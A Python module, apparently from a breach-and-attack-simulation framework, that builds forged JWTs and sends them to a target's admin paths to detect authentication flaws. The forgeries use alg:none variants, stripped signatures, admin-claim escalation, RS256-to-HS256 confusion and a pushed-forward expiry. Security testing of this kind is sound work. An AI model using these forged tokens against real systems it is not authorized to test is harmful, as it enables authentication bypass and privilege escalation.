"""
JWT (JSON Web Token) security testing module.

Tests for common JWT vulnerabilities:
- Algorithm confusion (none, HS256 vs RS256)
- Weak signing keys
- Missing expiration
- Signature stripping

MITRE ATT&CK: T1550 - Use Alternate Authentication Material
"""

from __future__ import annotations

import base64
import json
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)


class JWTModule(BaseAttackModule):
    """JWT security testing - algorithm confusion, weak keys, signature bypass."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="jwt",
            description="JWT testing - algorithm confusion, weak keys, signature bypass",
            category="jwt",
            mitre_technique_ids=["T1550", "T1078"],
            mitre_technique_names=["Use Alternate Authentication Material", "Valid Accounts"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT,
            owasp_category="A07:2021 - Identification and Authentication Failures",
            cwe_ids=["CWE-347", "CWE-327"],
            tags=["auth", "jwt", "token"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Generate JWT attack tokens."""
        original_token = options.get("token", "")
        payloads = []

        if original_token:
            payloads.extend(self._generate_jwt_attacks(original_token))
        else:
            # Generate generic test tokens
            payloads.extend(self._generate_generic_tokens())

        return payloads

    def _generate_jwt_attacks(self, original_token: str) -> list[str]:
        """Generate attack variants from an original JWT."""
        attacks = []
        try:
            parts = original_token.split(".")
            if len(parts) != 3:
                return attacks

            header = json.loads(b64url_decode(parts[0]))
            payload_data = json.loads(b64url_decode(parts[1]))
        except Exception:
            return attacks

        # 1. Algorithm: none
        for alg in ["none", "None", "NONE", "nOnE"]:
            new_header = {**header, "alg": alg}
            token = (
                b64url_encode(json.dumps(new_header).encode())
                + "."
                + b64url_encode(json.dumps(payload_data).encode())
                + "."
            )
            attacks.append(f"ALG_NONE:{token}")

        # 2. Strip signature
        attacks.append(f"NO_SIG:{parts[0]}.{parts[1]}.")

        # 3. Modify claims (admin escalation)
        if "role" in payload_data:
            escalated = {**payload_data, "role": "admin"}
            token = parts[0] + "." + b64url_encode(json.dumps(escalated).encode()) + "." + parts[2]
            attacks.append(f"ROLE_ESCALATION:{token}")

        if "admin" in payload_data:
            escalated = {**payload_data, "admin": True}
            token = parts[0] + "." + b64url_encode(json.dumps(escalated).encode()) + "." + parts[2]
            attacks.append(f"ADMIN_FLAG:{token}")

        if "sub" in payload_data:
            escalated = {**payload_data, "sub": "admin"}
            token = parts[0] + "." + b64url_encode(json.dumps(escalated).encode()) + "." + parts[2]
            attacks.append(f"SUB_ADMIN:{token}")

        # 4. Algorithm confusion (RS256 -> HS256)
        if header.get("alg", "").startswith("RS"):
            confused_header = {**header, "alg": "HS256"}
            token = (
                b64url_encode(json.dumps(confused_header).encode())
                + "."
                + b64url_encode(json.dumps(payload_data).encode())
                + ".fake_sig"
            )
            attacks.append(f"ALG_CONFUSION:{token}")

        # 5. Expired token (set exp to future)
        import time
        future_payload = {**payload_data, "exp": int(time.time()) + 86400 * 365}
        token = parts[0] + "." + b64url_encode(json.dumps(future_payload).encode()) + "." + parts[2]
        attacks.append(f"EXP_FUTURE:{token}")

        return attacks

    def _generate_generic_tokens(self) -> list[str]:
        """Generate generic JWT test tokens."""
        header = {"alg": "none", "typ": "JWT"}
        payload_data = {"sub": "admin", "role": "admin", "admin": True, "iat": 1700000000}

        token = b64url_encode(json.dumps(header).encode()) + "." + b64url_encode(json.dumps(payload_data).encode()) + "."
        return [
            f"ALG_NONE:{token}",
            f"GENERIC_ADMIN:{token}",
        ]

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        auth_header = options.get("auth_header", "Authorization")
        auth_prefix = options.get("auth_prefix", "Bearer ")
        path = options.get("path", "/api/admin")
        check_paths = options.get("check_paths", [path])

        for payload in payloads:
            attack_type, token = payload.split(":", 1) if ":" in payload else ("unknown", payload)
            for check_path in check_paths:
                req_id = str(uuid.uuid4())[:8]
                requests.append(AttackRequest(
                    request_id=f"jwt-{req_id}",
                    target=target,
                    method="GET",
                    path=check_path,
                    headers={
                        auth_header: f"{auth_prefix}{token}",
                        "X-BAS-Attack-Type": attack_type,
                    },
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        attack_type = request.headers.get("X-BAS-Attack-Type", "unknown")

        # Successful auth with manipulated token = vulnerability
        if response.status_code in (200, 201, 204):
            severity_map = {
                "ALG_NONE": "critical",
                "ALG_CONFUSION": "critical",
                "ROLE_ESCALATION": "critical",
                "ADMIN_FLAG": "critical",
                "SUB_ADMIN": "high",
                "NO_SIG": "critical",
                "EXP_FUTURE": "medium",
                "GENERIC_ADMIN": "high",
            }
            return ModuleResult(
                module_name="jwt",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"JWT {attack_type} attack accepted: server returned {response.status_code}",
                severity=severity_map.get(attack_type, "high"),
                mitre_technique_id="T1550",
                detail={"detection_type": f"jwt_{attack_type.lower()}", "attack_type": attack_type},
            )

        return ModuleResult(
            module_name="jwt",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
